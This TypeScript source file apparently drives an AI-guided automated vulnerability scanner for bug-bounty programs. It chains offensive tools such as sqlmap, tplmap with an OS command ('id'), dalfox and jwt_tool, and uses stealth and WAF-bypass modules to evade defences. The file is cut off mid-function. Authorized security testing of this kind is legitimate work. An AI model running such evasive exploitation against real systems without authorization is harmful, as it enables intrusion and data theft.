/**
 * Hunter Engine
 * Unified reasoning-driven scanner replacing traditional tool-chaining.
 * Implements: Observe → Hypothesize → Probe → Update reasoning loop.
 * Features: Anomaly-first scanning, real-time strategy adaptation, Tool Knowledge System.
 */
import { EventEmitter } from "events";
import { execFile } from "child_process";
import { promisify } from "util";
import axios from "axios";
import { v4 as uuidv4 } from "uuid";
import { db } from "../db";
import { huntSessions, findings, exploitChains, customTools } from "../db/schema";
import { eq, isNotNull, desc } from "drizzle-orm";
import logger from "../utils/logger";
import { contextWriter } from "../lib/context-writer";
import IntelligenceSynthesizer from "./WAFBypass";
import { ScopeGuard } from "../middleware/scopeGuard";
import { ModelRouter } from "../intelligence/ModelRouter";
import ROIModel from "../intelligence/ROIModel";
import { promptKB } from "../intelligence/PromptKnowledgeBase";
import { toolKnowledge } from "../lib/hunter/tool-knowledge";
import { ReinforcementWiring } from "../lib/hunter/reinforcement-wiring";
import { jsonPromptLoader } from "../intelligence/JsonPromptLoader";
import { stealthCoordinator, dynamicRateLimiter } from "../lib/stealth";
import { egressAllocator } from "../lib/stealth/egress-route-allocator";
import { temporalDecay } from "../lib/hunter/temporal-decay";
import { huntCortex } from "../lib/intelligence/hunt-cortex";
import { metaReasoner } from "../lib/intelligence/meta-reasoning";
import { backwardPlanner } from "../lib/intelligence/backward-planner";
import { observationCompressor } from "../lib/intelligence/observation-compressor";
import { nvdClient } from "../lib/intelligence/nvd-client";
import { sessionManager, AuthConfig } from "../lib/tools/session-manager";
import { callbackServer } from "../lib/oob/callback-server";
import { graphqlProber } from "../lib/tools/graphql-probe";
import { ssrfChainProber } from "../lib/tools/ssrf-chain-prober";
import { payloadMutator } from "../lib/tools/payload-mutator";
import { changeDetector } from "../lib/tools/change-detector";
import { secretScanner } from "../lib/tools/secret-scanner";
import { notificationService } from "../lib/services/notification-service";
import { webSocketProber } from "../lib/tools/websocket-probe";
import { cloudBucketProber } from "../lib/tools/cloud-bucket-probe";
import { prototypePollutionProber } from "../lib/tools/prototype-pollution-probe";
import { raceConditionDetector } from "../lib/tools/race-condition-detector";
import { hostHeaderProber } from "../lib/tools/host-header-probe";
import { crlfProber } from "../lib/tools/crlf-probe";
import { cookieFlagChecker } from "../lib/tools/cookie-flag-checker";
import { jsSPACrawler, deepCrawl } from "../lib/tools/js-spa-crawler";
import { ATTACK_TREES } from "../intelligence/ExploitChain";
import { writeFile } from "fs/promises";
import { tmpdir } from "os";
import { join } from "path";
import { programs } from "../db/schema";
import { parameterDiscovery } from "../lib/tools/parameter-discovery";
import { oauthProber } from "../lib/tools/oauth-probe";
import { massAssignmentProber } from "../lib/tools/mass-assignment-probe";
import { businessLogicProber } from "../lib/tools/business-logic-probe";
import { twoFactorBypassProber } from "../lib/tools/two-factor-bypass";
import { jwtConfusionProber } from "../lib/tools/jwt-confusion-probe";
import { techPayloadSelector } from "../lib/tools/tech-payload-selector";
import { openRedirectChainProber } from "../lib/tools/open-redirect-chain-probe";
import { blindXXEProber } from "../lib/tools/blind-xxe-probe";

const execFileAsync = promisify(execFile);

// ─── CVE seeding helpers ──────────────────────────────────────────────────────

const CVE_SEED_ALLOWLIST = new Set([
  "apache", "nginx", "iis", "lighttpd", "litespeed", "tomcat",
  "wordpress", "drupal", "joomla", "magento",
  "php", "node", "ruby", "python", "java",
  "openssl", "mod_ssl", "openssh",
  "mysql", "postgres", "mongodb", "redis",
  "jenkins", "gitlab", "grafana", "kibana",
  "spring", "struts", "rails",
  "weblogic", "websphere", "jboss",
]);

const CVE_SEED_BLOCKLIST = new Set([
  "jquery", "bootstrap", "angular", "react", "vue", "lodash", "underscore",
  "google analytics", "gtag", "cloudflare", "fastly", "cloudfront", "akamai",
  "font awesome", "moment",
]);

const CWE_TO_VULN_CLASS: Record<number, string> = {
  79: "xss", 89: "sqli", 22: "lfi", 78: "rce", 918: "ssrf",
  639: "idor", 287: "auth_bypass", 352: "csrf", 611: "xxe",
  942: "cors", 601: "open_redirect", 200: "info_disclosure", 16: "misconfig",
};

// ─── Types ────────────────────────────────────────────────────────────────────
export interface Observation {
  id: string;
  timestamp: number;
  source: string;  // tool name
  data: Record<string, unknown>;
  anomalyScore: number;
  tags: string[];
}

export interface Hypothesis {
  id: string;
  vulnClass: string;
  targetUrl: string;
  reasoning: string;
  confidence: number;
  priority: number;
  evidence: Observation[];
  status: "pending" | "probing" | "confirmed" | "rejected" | "inconclusive";
  createdAt: number;
  retryCount?: number;
  toolHint?: string;
  /** Which model generated this hypothesis — used to score model performance in RL store. */
  modelSource?: "claude" | "ollama" | "default";
}

export interface ProbeResult {
  hypothesisId: string;
  tool: string;
  command: string;
  output: string;
  parsed: Record<string, unknown>;
  success: boolean;
  duration: number;
}

export interface HuntState {
  sessionId: string;
  targetUrl: string;
  programId: number;
  phase: "observe" | "hypothesize" | "probe" | "update" | "complete";
  observations: Observation[];
  hypotheses: Hypothesis[];
  probes: ProbeResult[];
  confirmedFindings: HypothesisConfirmed[];
  iteration: number;
  maxIterations: number;
  budget: { maxRequests: number; requestsMade: number; maxTime: number; elapsed: number };
}

export interface HypothesisConfirmed {
  hypothesis: Hypothesis;
  proof: ProbeResult[];
  severity: string;
  cvssScore: number;
  exploitPayload: string;
}

// ─── Tool Knowledge System ────────────────────────────────────────────────────
// Commands return { bin, args } arrays — never interpolated shell strings —
// to prevent command injection via attacker-controlled URLs.
export const TOOL_KNOWLEDGE: Record<string, {
  description: string;
  vulnClasses: string[];
  command: (url: string, opts?: Record<string, string>) => { bin: string; args: string[] };
  parser: (output: string) => Record<string, unknown>;
  rateLimit: number; // seconds between invocations
}> = {
  nmap: {
    description: "Network port scanner and service fingerprinter",
    vulnClasses: ["open_ports", "service_enumeration", "os_detection"],
    command: (url) => ({
      bin: "nmap",
      args: ["-sV", "-sC", "--script=http-headers,http-title", "-p", "80,443,8080,8443",
             new URL(url).hostname, "--open", "-oX", "-"],
    }),
    parser: (output) => {
      const ports: string[] = [];
      const matches = output.match(/portid="(\d+)"[^>]*state="open"/g) || [];
      matches.forEach(m => { const p = m.match(/portid="(\d+)"/); if (p) ports.push(p[1]); });
      return { openPorts: ports, rawOutput: output.slice(0, 2000) };
    },
    rateLimit: 60,
  },
  nuclei: {
    description: "Fast vulnerability scanner with templated probes",
    vulnClasses: ["xss", "sqli", "rce", "ssrf", "lfi", "idor", "exposed_panels", "misconfig"],
    command: (url, opts) => ({
      bin: "nuclei",
      args: ["-u", url, "-severity", opts?.severity || "medium,high,critical",
             "-json", "-silent", "-timeout", "10"],
    }),
    parser: (output) => {
      const findings: unknown[] = [];
      output.split("\n").filter(l => l.trim()).forEach(line => {
        try { findings.push(JSON.parse(line)); } catch { /* skip non-JSON lines */ }
      });
      return { findings, count: findings.length };
    },
    rateLimit: 30,
  },
  ffuf: {
    description: "Fast web fuzzer for directory and parameter discovery",
    vulnClasses: ["hidden_endpoints", "backup_files", "admin_panels", "parameter_pollution"],
    command: (url) => ({
      bin: "ffuf",
      args: ["-u", `${url}/FUZZ`, "-w", "/usr/share/wordlists/dirb/common.txt",
             "-mc", "200,301,302,403", "-t", "50", "-timeout", "5", "-json"],
    }),
    parser: (output) => {
      try {
        const data = JSON.parse(output);
        return { results: data.results || [], total: data.results?.length || 0 };
      } catch {
        const results = output.match(/:: Progress.*?\n/g) || [];
        return { results, total: results.length };
      }
    },
    rateLimit: 10,
  },
  sqlmap: {
    description: "Automated SQL injection detection and exploitation",
    vulnClasses: ["sqli", "blind_sqli", "time_based_sqli", "error_based_sqli"],
    command: (url) => ({
      bin: "sqlmap",
      args: ["-u", url, "--batch", "--level=2", "--risk=2",
             "--timeout=10", "--output-dir=/tmp/sqlmap", "--forms"],
    }),
    parser: (output) => {
      const injectable = /parameter .* is vulnerable|sqlmap identified/.test(output);
      const dbms = output.match(/back-end DBMS: (.+)/)?.[1] || "unknown";
      return { injectable, dbms, output: output.slice(0, 1000) };
    },
    rateLimit: 60,
  },
  whatweb: {
    description: "Web technology fingerprinter",
    vulnClasses: ["tech_stack", "cms_detection", "framework_detection"],
    command: (url) => ({
      bin: "whatweb",
      args: ["--no-errors", "--aggression=3", "--log-json=-", url],
    }),
    parser: (output) => {
      try {
        const data = JSON.parse(output.split("\n").find(l => l.startsWith("[")) || "[]");
        return { technologies: data };
      } catch {
        return { rawOutput: output.slice(0, 500) };
      }
    },
    rateLimit: 5,
  },
  nikto: {
    description: "Web server vulnerability scanner",
    vulnClasses: ["misconfig", "outdated_software", "dangerous_files", "headers"],
    command: (url) => ({
      bin: "nikto",
      args: ["-h", url, "-Format", "json", "-timeout", "10", "-maxtime", "60"],
    }),
    parser: (output) => {
      const vulns = output.match(/OSVDB-\d+:.+/g) || [];
      const items = output.match(/\+ .+/g) || [];
      return { vulnerabilities: vulns, items: items.slice(0, 20), count: vulns.length };
    },
    rateLimit: 120,
  },
  gobuster: {
    description: "Directory/file brute-forcer",
    vulnClasses: ["hidden_endpoints", "backup_files", "exposed_configs"],
    command: (url) => ({
      bin: "gobuster",
      args: ["dir", "-u", url, "-w", "/usr/share/wordlists/dirb/common.txt",
             "-q", "--no-error", "-t", "50", "--timeout", "5s"],
    }),
    parser: (output) => {
      const found = output.match(/\/.+ \(\d+\)/g) || [];
      return { paths: found, count: found.length };
    },
    rateLimit: 30,
  },
  curl_probe: {
    description: "HTTP header and response analysis",
    vulnClasses: ["security_headers", "cors", "csrf", "information_disclosure", "open_redirect"],
    command: (url) => ({
      bin: "curl",
      args: ["-sI", "-L", "--max-time", "10", url],
    }),
    parser: (output) => {
      const headers: Record<string, string> = {};
      output.split("\n").forEach(line => {
        const m = line.match(/^([^:]+):\s*(.+)/);
        if (m) headers[m[1].toLowerCase().trim()] = m[2].trim();
      });
      const missing: string[] = [];
      const secHeaders = ["content-security-policy", "x-frame-options", "x-content-type-options", "strict-transport-security"];
      secHeaders.forEach(h => { if (!headers[h]) missing.push(h); });
      return { headers, missingSecurityHeaders: missing };
    },
    rateLimit: 1,
  },
  tplmap: {
    description: "Server-side template injection detection and exploitation",
    vulnClasses: ["ssti", "rce"],
    command: (url) => ({
      bin: "tplmap",
      args: ["-u", url, "--level", "5", "--os-cmd", "id"],
    }),
    parser: (output) => {
      const found = /Template Injection|Tplmap identified|injection point/i.test(output);
      const engine = output.match(/Template engine: (\w+)/i)?.[1] ?? "unknown";
      return { found, engine, rawOutput: output.slice(0, 500) };
    },
    rateLimit: 30,
  },
  dalfox: {
    description: "Fast XSS parameter analysis tool with blind XSS support",
    vulnClasses: ["xss"],
    command: (url) => ({
      bin: "dalfox",
      args: ["url", url, "--silence", "--output", "/dev/stdout", "--format", "plain"],
    }),
    parser: (output) => {
      const findings = output.match(/\[POC\].+/g) || [];
      return { found: findings.length > 0, findings, count: findings.length, rawOutput: output.slice(0, 800) };
    },
    rateLimit: 15,
  },
  jwt_tool: {
    description: "JWT algorithm confusion, none algorithm, and claim manipulation testing",
    vulnClasses: ["auth_bypass"],
    command: (url) => ({
      bin: "python3",
      args: ["/usr/local/bin/jwt_tool.py", url, "-t", url, "-M", "at", "-cv"],
    }),
    parser: (output) => {
      const vulnerable = /Exploit possible|none algorithm|algorithm confusion/i.test(output);
      const technique = output.match(/\[\+\] (.+)/)?.[1] ?? "";
      return { vulnerable, technique, rawOutput: output.slice(0, 600) };
    },
    rateLimit: 20,
  },
  smuggler: {
    description: "HTTP request smuggling detection (CL.TE and TE.CL)",
    vulnClasses: ["http_smuggling"],
    command: (url) => ({
      bin: "python3",
      args: ["/usr/local/bin/smuggler.py", "-u", url, "--no-color"],
    }),
    parser: (output) => {
      const vulnerable = /Issue found|CL\.TE|TE\.CL|TE\.TE/i.test(output);
      const type = output.match(/(CL\.TE|TE\.CL|TE\.TE)/)?.[1] ?? "unknown";
      return { vulnerable, type: vulnerable ? type : null, rawOutput: output.slice(0, 500) };
    },
    rateLimit: 60,
  },
};

const MAX_OBSERVATIONS = 500;
const MAX_HYPOTHESES = 150;
const MAX_PROBES = 1500;

// ─── Hunter Engine ────────────────────────────────────────────────────────────
// 5-minute TTL for custom tool cache (shared across all engine instances in a process)
let customToolsCacheTs = 0;
let customToolsCache: typeof TOOL_KNOWLEDGE = {};

// Binary availability cache — populated lazily, valid for the process lifetime
const binaryCache = new Map<string, string | null>();
function checkBinarySync(binary: string): string | null {
  if (binaryCache.has(binary)) return binaryCache.get(binary) ?? null;
  try {
    const { execSync } = require("child_process");
    const path = execSync(`which ${binary} 2>/dev/null`, { encoding: "utf8", timeout: 2000 }).trim();
    const result = path || null;
    binaryCache.set(binary, result);
    return result;
  } catch {
    binaryCache.set(binary, null);
    return null;
  }
}

function makeCustomParser(parserType: string): (output: string) => Record<string, unknown> {
  if (parserType === "json") {
    return (out) => { try { return JSON.parse(out) as Record<string, unknown>; } catch { return { output: out }; } };
  }
  if (parserType === "plain") {
    return (out) => ({ output: out, found: out.trim().length > 0 });
  }
  // lines (default)
  return (out) => ({ findings: out.split("\n").filter(Boolean), found: true });
}

export class HunterEngine extends EventEmitter {
  private state!: HuntState;
  private wafSynthesizer = new IntelligenceSynthesizer();
  private scopeGuard = ScopeGuard.getInstance();
  private modelRouter = ModelRouter.getInstance();
  private roiModel = new ROIModel();
  private rlWiring = new ReinforcementWiring();
  private toolLastUsed: Map<string, number> = new Map();
  private dbSessionId = 0;
  private campaignId = 0;
  private targetId = 0;
  private hardBanned = false;
  private consecutiveFailures = 0;
  private banCheckDone = false;
  private authHeaders: Record<string, string> = {};
  private authConfig: AuthConfig | null = null;
  private mergedTools: typeof TOOL_KNOWLEDGE = TOOL_KNOWLEDGE;

  private async loadCustomTools(): Promise<void> {
    const now = Date.now();
    if (now - customToolsCacheTs < 5 * 60 * 1000) {
      this.mergedTools = { ...TOOL_KNOWLEDGE, ...customToolsCache };
      return;
    }
    try {
      // Load DB-defined custom tools (user-defined, wins on collision)
      const rows = await db.select().from(customTools).where(
        (await import("drizzle-orm")).eq(customTools.enabled, true)
      );
      const dbBuilt: typeof TOOL_KNOWLEDGE = {};
      for (const t of rows) {
        const template = t.commandTemplate;
        dbBuilt[t.name] = {
          description: t.description,
          vulnClasses: (t.vulnClasses as string[]) || [],
          command: (url: string) => {
            const domain = (() => { try { return new URL(url).hostname; } catch { return url; } })();
            const parts = template.replace("{url}", url).replace("{domain}", domain).split(/\s+/).filter(Boolean);
            return { bin: parts[0], args: parts.slice(1) };
          },
          parser: makeCustomParser(t.parserType),
          rateLimit: t.rateLimit,
        };
      }

      // Load Kali catalog tools that are installed on this machine
      const { KALI_CATALOG } = await import("../lib/hunter/kali-catalog");
      const catalogBuilt: typeof TOOL_KNOWLEDGE = {};
      for (const entry of KALI_CATALOG) {
        if (TOOL_KNOWLEDGE[entry.name] || dbBuilt[entry.name]) continue; // hardcoded or DB wins
        const binaryPath = checkBinarySync(entry.binary);
        if (!binaryPath) continue;
        const template = entry.commandTemplate;
        catalogBuilt[entry.name] = {
          description: entry.description,
          vulnClasses: entry.vulnClasses,
          command: (url: string) => {
            const domain = (() => { try { return new URL(url).hostname; } catch { return url; } })();
            const parts = template.replace("{url}", url).replace("{domain}", domain).split(/\s+/).filter(Boolean);
            return { bin: parts[0], args: parts.slice(1) };
          },
          parser: makeCustomParser(entry.parserType),
          rateLimit: entry.rateLimit,
        };
      }

      const combined = { ...catalogBuilt, ...dbBuilt };
      customToolsCache = combined;
      customToolsCacheTs = now;
      this.mergedTools = { ...TOOL_KNOWLEDGE, ...combined };

      const catalogCount = Object.keys(catalogBuilt).length;
      const dbCount = Object.keys(dbBuilt).length;
      if (catalogCount > 0 || dbCount > 0) {
        logger.info(`[HunterEngine] Tool registry: ${catalogCount} catalog + ${dbCount} custom + ${Object.keys(TOOL_KNOWLEDGE).length} built-in`);
      }
    } catch (err) {
      logger.warn("[HunterEngine] Failed to load custom tools, using defaults", { err: String(err) });
      this.mergedTools = TOOL_KNOWLEDGE;
    }
  }

  async startHunt(params: {
    targetUrl: string;
    programId: number;
    campaignId: number;
    targetId?: number;
    sessionId?: string;
    maxIterations?: number;
    budget?: Partial<HuntState["budget"]>;
    focusVulnClasses?: string[];
  }): Promise<string> {
    await this.loadCustomTools();

    const sessionUuid = params.sessionId || uuidv4();
    this.campaignId = params.campaignId;
    this.targetId = params.targetId ?? 0;

    this.state = {
      sessionId: sessionUuid,
      targetUrl: params.targetUrl,
      programId: params.programId,
      phase: "observe",
      observations: [],
      hypotheses: [],
      probes: [],
      confirmedFindings: [],
      iteration: 0,
      maxIterations: params.maxIterations || 10,
      budget: {
        maxRequests: params.budget?.maxRequests || 5000,
        requestsMade: 0,
        maxTime: params.budget?.maxTime || 7200,
        elapsed: 0,
      },
    };

    // Persist session and capture the real DB ID
    const [session] = await db.insert(huntSessions).values({
      campaignId: params.campaignId,
      targetId: params.targetId ?? 0,
      sessionUuid,
      phase: "observe",
      status: "running",
    }).returning();
    this.dbSessionId = session.id;

    // Pre-seed hypotheses from template focus classes if provided
    if (params.focusVulnClasses?.length) {
      for (const vc of params.focusVulnClasses) {
        this.state.hypotheses.push({
          id: uuidv4(),
          vulnClass: vc,
          targetUrl: params.targetUrl,
          reasoning: `Template-focused: ${vc} is a priority for this hunt`,
          confidence: 0.6,
          priority: 9,
          evidence: [],
          status: "pending",
          createdAt: Date.now(),
        });
      }
    }

    // Load auth config for this program and establish session if configured
    try {
      const [prog] = await db.select({ authConfig: programs.authConfig })
        .from(programs).where(eq(programs.id, params.programId)).limit(1);
      if (prog?.authConfig) {
        this.authConfig = prog.authConfig as AuthConfig;
        const session = await sessionManager.login(params.programId, this.authConfig);
        this.authHeaders = session.headers;
        logger.info("[HunterEngine] Authenticated session established", { programId: params.programId });
      }
    } catch (err) {
      logger.warn("[HunterEngine] Auth setup failed — continuing unauthenticated", { err: String(err) });
    }

    this.rlWiring.onHuntStart({
      sessionId: sessionUuid,
      programId: params.programId,
      programType: "web_app",
    });
    contextWriter.reset(sessionUuid, params.targetUrl, "ollama");
    this.emit("hunt:started", { sessionUuid, targetUrl: params.targetUrl });
    logger.info("Hunt started", { sessionUuid, targetUrl: params.targetUrl });

    // Run stealth warmup before probing so WAF/CDN fingerprinting is pre-loaded
    try {
      const domain = new URL(params.targetUrl).hostname;
      await stealthCoordinator.runWarmup(domain, 'generic', false, params.programId);
    } catch { /* non-critical — target may not be reachable yet */ }

    // Run the main loop asynchronously
    this.runLoop().catch(err => {
      logger.error("Hunt loop error", { sessionUuid, err });
      this.emit("hunt:error", { sessionUuid, error: String(err) });
    });

    return sessionUuid;
  }

  /** Yield to the Node.js event loop so other async tasks (socket.io, sibling hunts)
   *  can process pending callbacks between heavy model-inference phases. */
  private yieldToEventLoop(): Promise<void> {
    return new Promise(resolve => setImmediate(resolve));
  }

  private async runLoop(): Promise<void> {
    const startTime = Date.now();

    while (
      this.state.iteration < this.state.maxIterations &&
      this.state.budget.requestsMade < this.state.budget.maxRequests &&
      (Date.now() - startTime) / 1000 < this.state.budget.maxTime &&
      !this.hardBanned
    ) {
      this.state.iteration++;
      this.state.budget.elapsed = (Date.now() - startTime) / 1000;

      // Yield before each phase so concurrent hunts / socket events aren't starved
      await this.yieldToEventLoop();

      this.emit("hunt:phase", { phase: this.state.phase, iteration: this.state.iteration });
      contextWriter.updateState({
        phase: this.state.phase,
        iteration: this.state.iteration,
        hypothesesCount: this.state.hypotheses.length,
        findingsCount: this.state.confirmedFindings.length,
      });

      try {
        switch (this.state.phase) {
          case "observe":
            await this.observe();
            await this.yieldToEventLoop();
            this.state.phase = "hypothesize";
            break;
          case "hypothesize":
            await this.hypothesize();
            await this.yieldToEventLoop();
            this.state.phase = "probe";
            break;
          case "probe":
            await this.probe();
            await this.yieldToEventLoop();
            this.state.phase = "update";
            break;
          case "update":
            await this.update();
            // Determine next phase based on state
            if (this.state.hypotheses.filter(h => h.status === "pending").length > 0) {
              this.state.phase = "probe";
            } else {
              this.state.phase = "observe"; // re-observe with new knowledge
            }
            break;
        }
      } catch (err) {
        logger.error("Hunt phase error", { phase: this.state.phase, err });
      }

      // Every 3 iterations check hunt health and trigger meta-reasoner pivot if degraded
      if (this.state.iteration % 3 === 0) {
        try {
          const health = huntCortex.computeHuntHealth(this.state.sessionId);
          if (health.health < 0.4) {
            const decision = await metaReasoner.evaluateEnriched(this.state.sessionId);
            if (decision.action === 'pivot') {
              const paths = backwardPlanner.getOptimalPath(this.state.phase, undefined, undefined);
              const pivotHypotheses = paths.slice(0, 2).map(p => ({
                id: uuidv4(),
                vulnClass: p.path.vulnerability,
                targetUrl: this.state.targetUrl,
                reasoning: `Meta-reasoner pivot (health=${health.health.toFixed(2)}): ${p.path.goal}`,
                confidence: Math.min(0.85, p.adjustedLikelihood),
                priority: Math.min(10, Math.round(p.path.priority)),
                evidence: [],
                status: 'pending' as const,
                createdAt: Date.now(),
              }));
              this.state.hypotheses.push(...pivotHypotheses);
              if (this.state.hypotheses.length > MAX_HYPOTHESES) {
                this.state.hypotheses.sort((a, b) => (b.priority * b.confidence) - (a.priority * a.confidence));
                this.state.hypotheses.splice(MAX_HYPOTHESES);
              }
              this.state.phase = 'probe';
              this.emit('hunt:pivot', { sessionId: this.state.sessionId, reason: decision.rationale, newHypotheses: pivotHypotheses.length });
              logger.info('[HunterEngine] Strategy pivot injected', { health: health.health, paths: pivotHypotheses.length, rationale: decision.rationale });
            }
          }
        } catch { /* non-critical — health check failure must not stop the hunt */ }
      }
    }

    this.state.phase = "complete";
    observationCompressor.clearSession(this.state.sessionId);
    // Release the authenticated session so credentials/cookies aren't held after the hunt.
    if (this.authConfig) {
      sessionManager.invalidate(this.state.programId);
    }
    this.rlWiring.onHuntComplete({
      sessionId: this.state.sessionId,
      programId: this.state.programId,
      programType: "web_app",
      confirmedFindings: this.state.confirmedFindings.length,
      totalProbes: this.state.probes.length,
      chainIds: [],
    });
    await this.persistResults();
    this.emit("hunt:complete", {
      sessionId: this.state.sessionId,
      findings: this.state.confirmedFindings.length,
      iterations: this.state.iteration,
    });
    logger.info("Hunt complete", {
      sessionId: this.state.sessionId,
      confirmedFindings: this.state.confirmedFindings.length,
    });
  }

  // ── Phase 1: Observe ────────────────────────────────────────────────────────
  private async observe(): Promise<void> {
    logger.info("OBSERVE phase", { session: this.state.sessionId, iteration: this.state.iteration });

    // Initial observation: fingerprint the target — emit probing/result per tool
    // so the activity feed shows immediate activity rather than a blank wait.
    const t0 = Date.now();
    this.emit("hunt:probing", { hypothesisId: this.state.sessionId, vulnClass: "observe", tool: "whatweb" });
    const techObs = await this.runTool("whatweb", this.state.targetUrl);
    this.emit("hunt:probe_result", {
      hypothesisId: this.state.sessionId,
      result: { tool: "whatweb", success: true, output: JSON.stringify(techObs).slice(0, 300), duration: Date.now() - t0 },
    });

    const t1 = Date.now();
    this.emit("hunt:probing", { hypothesisId: this.state.sessionId, vulnClass: "observe", tool: "curl_probe" });
    const headerObs = await this.runTool("curl_probe", this.state.targetUrl);
    this.emit("hunt:probe_result", {
      hypothesisId: this.state.sessionId,
      result: { tool: "curl_probe", success: true, output: JSON.stringify(headerObs).slice(0, 300), duration: Date.now() - t1 },
    });

    const t2 = Date.now();
    this.emit("hunt:probing", { hypothesisId: this.state.sessionId, vulnClass: "observe", tool: "waf_intel" });
    const wafIntel = await this.wafSynthesizer.synthesize(this.state.targetUrl, "<script>alert(1)</script>");
    this.emit("hunt:probe_result", {
      hypothesisId: this.state.sessionId,
      result: { tool: "waf_intel", success: true, output: `waf=${(wafIntel as unknown as Record<string, unknown>).detectedWAF ?? "none"} confidence=${wafIntel.detectionConfidence?.toFixed(2)}`, duration: Date.now() - t2 },
    });

    // Anomaly-first: compute anomaly scores
    const obs: Observation[] = [
      {
        id: uuidv4(),
        timestamp: Date.now(),
        source: "whatweb",
        data: techObs,
        anomalyScore: this.computeAnomalyScore(techObs),
        tags: ["fingerprint"],
      },
      {
        id: uuidv4(),
        timestamp: Date.now(),
        source: "curl_probe",
        data: headerObs,
        anomalyScore: this.computeAnomalyScore(headerObs),
        tags: ["headers", "security"],
      },
      {
        id: uuidv4(),
        timestamp: Date.now(),
        source: "waf_intel",
        data: wafIntel as unknown as Record<string, unknown>,
        anomalyScore: wafIntel.detectionConfidence,
        tags: ["waf"],
      },
    ];

    // Sort by anomaly score (anomaly-first scanning)
    obs.sort((a, b) => b.anomalyScore - a.anomalyScore);
    this.state.observations.push(...obs);
    while (this.state.observations.length > MAX_OBSERVATIONS) this.state.observations.shift();

    this.emit("hunt:observations", { count: obs.length, observations: obs });

    // CVE-seeded hypothesis injection — first observe pass only
    if (this.state.iteration === 1) {
      await this.seedCVEHypotheses(techObs).catch(err =>
        logger.warn("[HunterEngine] CVE seeding failed (non-critical)", { err: String(err) })
      );
      // GraphQL probing — detect and introspect any GraphQL endpoints
      await this.probeGraphQL().catch(err =>
        logger.warn("[HunterEngine] GraphQL probing failed (non-critical)", { err: String(err) })
      );
      await Promise.allSettled([
      // Secret scanning — look for leaked credentials in response bodies
      (async () => {
        try {
          const secretResult = await secretScanner.scan(this.state.targetUrl, this.authHeaders);
          if (secretResult.matches.length > 0) {
            for (const hyp of secretResult.hypotheses) {
              this.state.hypotheses.push({
                id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: this.state.targetUrl,
                reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
                evidence: [], status: "pending", createdAt: Date.now(),
              });
            }
            this.emit("hunt:secrets_found", {
              sessionId: this.state.sessionId,
              count: secretResult.matches.length,
              types: [...new Set(secretResult.matches.map(m => m.type))],
            });
            await notificationService.notifyIfWorthy({
              type: "secret_found",
              targetUrl: this.state.targetUrl,
              detail: secretResult.matches.map(m => `${m.type}: ${m.value}`).join(", "),
            });
          }
        } catch (err) {
          logger.debug("[HunterEngine] Secret scan skipped (non-critical)", { err: String(err) });
        }
      })(),

      // Diff-based change detection — compare endpoint responses against last baseline
      (async () => {
        try {
          const changeReport = await changeDetector.detect(this.state.targetUrl, this.authHeaders);
          for (const hyp of changeReport.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(),
              vulnClass: hyp.vulnClass,
              targetUrl: this.state.targetUrl,
              reasoning: hyp.reasoning,
              confidence: hyp.confidence,
              priority: hyp.priority,
              evidence: [],
              status: "pending",
              createdAt: Date.now(),
            });
          }
          if (changeReport.newEndpoints.length > 0 || changeReport.changedEndpoints.length > 0) {
            this.emit("hunt:changes_detected", {
              sessionId: this.state.sessionId,
              newEndpoints: changeReport.newEndpoints,
              changed: changeReport.changedEndpoints.length,
            });
          }
        } catch (err) {
          logger.debug("[HunterEngine] Change detection skipped (non-critical)", { err: String(err) });
        }
      })(),

      // WebSocket security probing
      (async () => {
        try {
          const wsResult = await webSocketProber.probe(this.state.targetUrl, this.authHeaders);
          for (const hyp of wsResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [], status: "pending", createdAt: Date.now(),
            });
          }
          if (wsResult.vulns.length > 0) {
            this.emit("hunt:ws_vulns", { sessionId: this.state.sessionId, count: wsResult.vulns.length, endpoints: wsResult.endpointsFound, issues: wsResult.vulns.map(v => v.issue) });
          }
        } catch (err) { logger.debug("[HunterEngine] WS probe skipped", { err: String(err) }); }
      })(),

      // Cloud bucket exposure probing
      (async () => {
        try {
          const bucketResult = await cloudBucketProber.probe(this.state.targetUrl);
          for (const hyp of bucketResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [], status: "pending", createdAt: Date.now(),
            });
          }
          if (bucketResult.buckets.length > 0) {
            this.emit("hunt:bucket_exposed", { sessionId: this.state.sessionId, buckets: bucketResult.buckets.map(b => ({ url: b.bucketUrl, provider: b.provider, listable: b.listable })) });
            for (const bucket of bucketResult.buckets) {
              if (bucket.severity === "critical" || bucket.severity === "high") {
                await notificationService.notifyIfWorthy({ type: "finding_confirmed", severity: bucket.severity, vulnType: "cloud_storage_exposure", targetUrl: bucket.bucketUrl, detail: bucket.detail }).catch(() => {});
              }
            }
          }
        } catch (err) { logger.debug("[HunterEngine] Bucket probe skipped", { err: String(err) }); }
      })(),

      // Prototype pollution probing
      (async () => {
        try {
          const ppResult = await prototypePollutionProber.probe(this.state.targetUrl, this.authHeaders);
          for (const hyp of ppResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [], status: "pending", createdAt: Date.now(),
            });
          }
          if (ppResult.vulns.length > 0) {
            this.emit("hunt:proto_pollution", { sessionId: this.state.sessionId, count: ppResult.vulns.length, reflected: ppResult.vulns.some(v => v.reflected) });
          }
        } catch (err) { logger.debug("[HunterEngine] Prototype pollution probe skipped", { err: String(err) }); }
      })(),

      // Race condition probing
      (async () => {
        try {
          const raceResult = await raceConditionDetector.probe(this.state.targetUrl, this.authHeaders);
          for (const hyp of raceResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [], status: "pending", createdAt: Date.now(),
            });
          }
          if (raceResult.vulns.length > 0) {
            this.emit("hunt:race_condition", { sessionId: this.state.sessionId, count: raceResult.vulns.length, endpoints: raceResult.vulns.map(v => v.endpoint) });
          }
        } catch (err) { logger.debug("[HunterEngine] Race condition probe skipped", { err: String(err) }); }
      })(),

      // Host header injection probing
      (async () => {
        try {
